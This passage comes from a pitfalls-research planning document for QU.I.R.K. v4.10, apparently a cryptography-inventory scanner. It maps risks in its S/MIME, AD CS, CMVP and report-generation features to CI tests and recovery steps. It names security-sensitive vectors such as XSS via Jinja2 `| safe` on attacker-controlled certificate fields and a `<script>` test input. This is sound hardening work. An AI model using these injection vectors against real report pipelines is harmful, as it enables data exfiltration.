| macOS chaos lab bind-mounts (pre-Phase 999.84 pattern) | Simpler compose file | Fails silently or loops on macOS Docker Desktop | Never for new profiles — always named volumes or env-var credentials |
| ESC-number findings from LDAP-only evidence | Sounds impressive | High false-positive rate destroys finding credibility | Never without full ACL + RPC verification |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| S/MIME via imaplib | FETCH full message including text body | FETCH only `BODY[2]` (or the MIME part with `Content-Type: application/pkcs7-signature`); never store envelope headers |
| asn1crypto CMS parsing | Using `cryptography` lib directly for CMS blob | Parse CMS with `asn1crypto.cms.ContentInfo.load()` (BER-tolerant); extract cert DER then pass to `cryptography.x509.Certificate.from_der()` |
| impacket TGT acquisition | Calling `getKerberosTGT()` without timeout/exception handling | Wrap in `_wrapped_phase` pattern; credential failure must emit `coverage_gap`, not crash |
| CMVP NIST feed | JSON GET without structural assertion | Assert top-level keys post-parse; fall back to bundled offline snapshot on failure |
| Playwright PDF export | Relying on `page.route()` SSRF clamp to block injected scripts | Separate concerns: SSRF clamp blocks outbound navigation, autoescape blocks inline script injection — both must be active |
| Homebrew formula | Publishing to homebrew-core | Maintain a private tap (`homebrew-quirk`); homebrew-core requires dedicated maintainer and strict formula review process |
| sigstore cosign | Running `cosign sign-blob` in local `make release` | Gate signing behind `GITHUB_ACTIONS` check; local builds produce unsigned artifacts only |
| PyPI name | Assuming `quirk` is available | Check `pip index versions quirk` and `test.pypi.org` upload before production push |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| S/MIME scanner logs `Subject:` header | PII exposure in deliverable PDF | AST CI gate asserting `subject`, `from_addr`, `to_addr` never appear in `smime_scan_json` write paths |
| `| safe` on adversary-controlled cert CN in HTML template | XSS / Playwright PDF exfiltration | CI grep gate on template files; unit test rendering `<script>` tag through the full template path |
| AD CS `certified: true` from algorithm name match only | False FIPS attestation — destroys credibility | Negative CI test: assert `certified` is never set by CMVP module alone |
| Unsigned release artifacts with no provenance | Supply chain compromise undetectable | Sigstore GHA workflow; `SECURITY.md` documents verification steps |
| Impacket credential in scan error log | Password/hash in `scan_error` column | Extend `safe_str()` and AST gate to AD CS scan paths before any credential-handling code is written |
| CMVP offline snapshot bundled with private API keys or internal metadata | Inadvertent data disclosure in PyPI wheel | Strip all non-public fields from bundled snapshot; run `pip show -f quirk` post-install to verify snapshot path |

---

## "Looks Done But Isn't" Checklist

- [ ] **S/MIME scanner:** Has a `service_detail` prefix distinct from transport TLS entries — verify no duplicate CBOM component refs (`test_cbom_writer_validation.py` passes for the `email` profile after adding S/MIME)
- [ ] **S/MIME scanner:** Privacy test (`test_smime_no_envelope_leak.py`) asserts no envelope fields in `smime_scan_json`
- [ ] **S/MIME scanner:** BER-encoded CMS fixture is in the chaos lab profile (not just hand-crafted DER)
- [ ] **AD CS connector:** `coverage_gap` finding emitted when LDAP bind fails with no credentials — verified in CI with mocked auth failure
- [ ] **AD CS connector:** No ESC-numbered finding emitted without `--adcs-deep` flag — negative test asserts this
- [ ] **AD CS chaos lab:** `./lab.sh all` completes without error on macOS Docker Desktop (Linux-native LDAP mock)
- [ ] **HTML/PDF injection:** `grep "| safe" quirk/reports/templates/*.j2` returns zero results on scanner-output variable lines
- [ ] **HTML/PDF injection:** Unit test renders a `<script>` tag in a finding field and asserts `&lt;script&gt;` in output
- [ ] **CMVP feed:** Structural assertion test: feed JSON with missing top-level key causes fallback to offline snapshot, not silent empty result
- [ ] **CMVP feed:** `certified: true` never appears in CBOM output — negative CI test
- [ ] **Release engineering:** `python -c "import quirk; print(quirk.__version__)"` matches `git describe --tags --abbrev=0`
- [ ] **Release engineering:** `SECURITY.md` exists and documents signing identity before first signed release
- [ ] **Release engineering:** `test.pypi.org` upload succeeds before production PyPI push
- [ ] **Chaos lab fidelity:** `expected_results_v4.md` finding categories and severities match current scanner output — golden snapshot comparison test passes
- [ ] **Chaos lab fidelity:** `./lab.sh down --volumes && ./lab.sh all` succeeds on macOS (volume migration UAT)

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| S/MIME content leaks into deliverable | HIGH | Patch `smime_scan_json` scrubbing; run `DELETE FROM scan_sessions WHERE ...` for affected scans; notify client of rescan |
| impacket conflict breaks TLS scanner post-install | HIGH | Roll back to pre-AD CS pyproject.toml; `pip install quirk` without `[adcs]`; urgent patch release |
| CMVP feed structural break causes silent empty attestation | MEDIUM | CI staleness gate surfaces within 90 days; switch to offline snapshot; patch feed parser in next release |
| False ESC finding in delivered report | HIGH | Issue retraction note; re-verify with explicit ACL check; update finding scope documentation |
| Version mismatch in PyPI wheel | MEDIUM | PyPI allows yanking a release; yank bad version; republish with corrected version; update CHANGELOG |
| `| safe` XSS in HTML report | HIGH | Emergency patch; re-generate all reports for affected scan sessions; audit for active exploitation |
| macOS chaos lab stale named volume | LOW | `docker volume rm chaoslab_<name>`; re-run `./lab.sh all` |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| S/MIME content vs. envelope confusion (P1) | S/MIME scanner | `test_cbom_writer_validation.py` passes for `email` profile; no duplicate `bom-ref` |
| S/MIME BER ASN.1 parsing (P2) | S/MIME scanner | BER fixture in chaos lab; integration test covers BER path |
| S/MIME mailbox privacy (P3) | S/MIME scanner | `test_smime_no_envelope_leak.py` — no forbidden keys in `smime_scan_json` |
| impacket transitive conflict (P4) | AD CS connector | CI matrix: `pip install quirk[adcs]` → `cryptography>=44.0` asserted |
| ESC false positives (P5) | AD CS connector | Negative test: no ESC findings without `--adcs-deep`; findings limited to crypto properties |
| AD CS auth without credentials (P6) | AD CS connector | Mock LDAP bind failure → `coverage_gap` emitted; scan completes normally |
| Windows containers impractical on macOS (P7) | AD CS connector | `./lab.sh all` succeeds on macOS; no Windows image in compose file |
| HTML Jinja2 `| safe` injection (P8) | HTML/PDF injection hardening | CI grep gate zero results; unit test `<script>` → `&lt;script&gt;` |
| Playwright PDF metadata injection (P9) | HTML/PDF injection hardening | Unit test: crafted target name → sanitized PDF `<title>` |
| CMVP feed silent structural break (P10) | CMVP attestation feed | Structural assertion test; offline snapshot fallback test |
| Algorithm→CMVP false attestation (P11) | CMVP attestation feed | Negative test: `certified` never set by CMVP module |
| Version string drift (P12) | Release engineering | `importlib.metadata` source of truth; CI tag vs version check |
| Sigstore keyless local failure (P13) | Release engineering | `GITHUB_ACTIONS` guard in release script; local `make dist` produces unsigned only |
| PyPI name collision (P14) | Release engineering | `test.pypi.org` upload before production; name availability check is phase task 1 |
| Oracle drift (P15) | Chaos-lab fidelity | Golden snapshot comparison test; CLAUDE.md chaos-lab rule enforced in PR checklist |
| macOS named volume stale state (P16) | Chaos-lab fidelity | `./lab.sh down --volumes && ./lab.sh all` UAT; README documents migration step |

---

## Sources

- QUIRK codebase: `quirk/scanner/email_scanner.py`, `kerberos_scanner.py`, `reports/html_renderer.py`, `reports/_md_escape.py`, `dashboard/api/routes/pdf.py`, `compliance/__init__.py`, `cbom/classifier.py` (direct inspection 2026-05-16)
- QUIRK Key Decisions table in `.planning/PROJECT.md`: impacket/pyOpenSSL conflict (confirmed), SAML_NS silent empty (confirmed), `_wrapped_phase` pattern (confirmed), CBOM schema validation gate (confirmed), `safe_str()` AST gate (confirmed)
- Phase 999.84 CONTEXT.md: macOS bind-mount root causes (ldaps chown, rabbitmq erlang cookie, gitea seed idempotency) — confirmed log evidence
- Phase 999.83 deferred-items.md: DEF-999.83-A/B/C with confirmed symptoms
- QUIRK CI gates: `python-staleness.yml` (staleness pattern), `dashboard-quality.yml` (axe-core), Phase 42 schema validation gate, Phase 59 AST credential-leakage gate, Phase 62 `check-cancelled-guards.sh`
- asn1crypto issue #18: CMS indefinite-length BER encoding from Thunderbird (community-confirmed)
- impacket issue #1716: PyOpenSSL PKCS12 removal breaking ntlmrelayx (active pyOpenSSL conflict evidence)
- Certipy issue #328: cross-realm LDAP KDC IP ignored (impacket cross-realm SPN handling)
- sigstore cosign docs: keyless signing requires OIDC token; GITHUB_ACTIONS is the supported environment
- NIST CSRC CMVP: no schema version published; JSON export is unofficial scraping surface
- Docker Desktop macOS bind-mount permission model: uid/gid mapping differs from Linux (confirmed via Phase 999.83/999.84)

---
*Pitfalls research for: QU.I.R.K. v4.10 Launch Readiness — S/MIME, AD CS, injection hardening, CMVP, release engineering, chaos-lab fidelity*
*Researched: 2026-05-16*
